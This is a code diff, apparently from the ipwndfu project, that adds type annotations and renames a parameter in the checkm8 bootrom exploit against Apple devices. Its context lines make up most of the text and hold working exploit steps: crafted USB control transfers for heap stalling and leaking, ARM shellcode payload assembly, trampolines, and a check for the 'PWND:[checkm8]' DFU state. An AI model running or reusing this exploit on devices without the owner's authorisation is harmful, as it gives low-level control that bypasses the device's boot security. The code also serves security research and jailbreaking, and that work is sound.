@@ -7,11 +7,13 @@ import pkgutil
 import struct
 import sys
 import time
+import typing
 from contextlib import suppress
 from typing import TYPE_CHECKING, Optional, Tuple, Union
 
+import dfu
+
 import usb  # type: ignore
-from ipwndfu import dfu
 
 if TYPE_CHECKING:
     from usb.core import Device  # type: ignore
@@ -138,7 +140,7 @@ def asm_arm64_x7_trampoline(dest: int) -> bytes:
 
 # THUMB +0 [0xF000F8DF, ADDR]  LDR.W   PC, [PC]
 # THUMB +2 [0xF002F8DF, ADDR]  LDR.W   PC, [PC, #2]
-def asm_thumb_trampoline(src, dest):
+def asm_thumb_trampoline(src: int, dest: int) -> bytes:
     assert src % 2 == 1 and dest % 2 == 1
     if src % 4 == 1:
         return struct.pack("<2I", 0xF000F8DF, dest)
@@ -182,7 +184,7 @@ def stall(device: "Device") -> None:
     libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, b"A" * 0xC0, 0.00001)
 
 
-def leak(device: "Device"):
+def leak(device: "Device") -> None:
     libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
 
 
@@ -198,7 +200,7 @@ def usb_req_leak(device: "Device") -> None:
     libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40, 1)
 
 
-def usb_req_no_leak(device: "Device"):
+def usb_req_no_leak(device: "Device") -> None:
     libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41, 1)
 
 
@@ -253,7 +255,7 @@ def payload(cpid: int) -> bytes:
         )
         assert len(s5l8947x_shellcode) <= PAYLOAD_OFFSET_ARMV7
         assert len(s5l8947x_handler) <= PAYLOAD_SIZE_ARMV7
-        return (
+        return bytes(
             s5l8947x_shellcode
             + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode))
             + s5l8947x_handler
@@ -820,10 +822,10 @@ def exploit_config(serial_number: str) -> Tuple[bytes, DeviceConfig]:
     sys.exit(1)
 
 
-def exploit(match: None = None) -> None:
+def exploit(match_device: typing.Optional[str] = None) -> None:
     print("*** checkm8 exploit by axi0mX ***")
 
-    device = dfu.acquire_device(match=match)
+    device = dfu.acquire_device(match_device=match_device)
     assert device
     start = time.time()
     print("Found:", device.serial_number)
@@ -847,7 +849,7 @@ def exploit(match: None = None) -> None:
     dfu.usb_reset(device)
     dfu.release_device(device)
 
-    device = dfu.acquire_device(match=match)
+    device = dfu.acquire_device(match_device=match_device)
     assert device
     device.__getattribute__("serial_number")
     libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b"A" * 0x800, 0.0001)
@@ -858,7 +860,7 @@ def exploit(match: None = None) -> None:
 
     time.sleep(0.5)
 
-    device = dfu.acquire_device(match=match)
+    device = dfu.acquire_device(match_device=match_device)
     assert device
     usb_req_stall(device)
     if config.large_leak is not None:
@@ -875,7 +877,7 @@ def exploit(match: None = None) -> None:
     dfu.usb_reset(device)
     dfu.release_device(device)
 
-    device = dfu.acquire_device(match=match)
+    device = dfu.acquire_device(match_device=match_device)
     assert device
 
     if "PWND:[checkm8]" not in device.serial_number:
@@ -886,10 +888,10 @@ def exploit(match: None = None) -> None:
     dfu.release_device(device)
 
 
-def exploit_a8_a9(match=None):
+def exploit_a8_a9(match_device: typing.Optional[str] = None) -> None:
     print("*** checkm8 exploit by axi0mX ***")
 
-    device = dfu.acquire_device(match=match)
+    device = dfu.acquire_device(match_device=match_device)
     start = time.time()
     print("Found:", device.serial_number)
     if "PWND:[" in device.serial_number:
@@ -914,7 +916,7 @@ def exploit_a8_a9(match=None):
     dfu.usb_reset(device)
     dfu.release_device(device)
 
-    device = dfu.acquire_device(match=match)
+    device = dfu.acquire_device(match_device=match_device)
     device.__getattribute__("serial_number")
     libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b"A" * 0x800, 0.0001)
     libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, b"A" * padding, 10)
@@ -923,7 +925,7 @@ def exploit_a8_a9(match=None):
 
     time.sleep(0.5)
 
-    device = dfu.acquire_device(match=match)
+    device = dfu.acquire_device(match_device=match_device)
     usb_req_stall(device)
     usb_req_leak(device)
     usb_req_leak(device)
@@ -936,7 +938,7 @@ def exploit_a8_a9(match=None):
     dfu.usb_reset(device)
     dfu.release_device(device)
 
-    device = dfu.acquire_device(match=match)
+    device = dfu.acquire_device(match_device=match_device)
     if "PWND:[checkm8]" not in device.serial_number:
         print("ERROR: Exploit failed. Device did not enter pwned DFU Mode.")
         sys.exit(1)
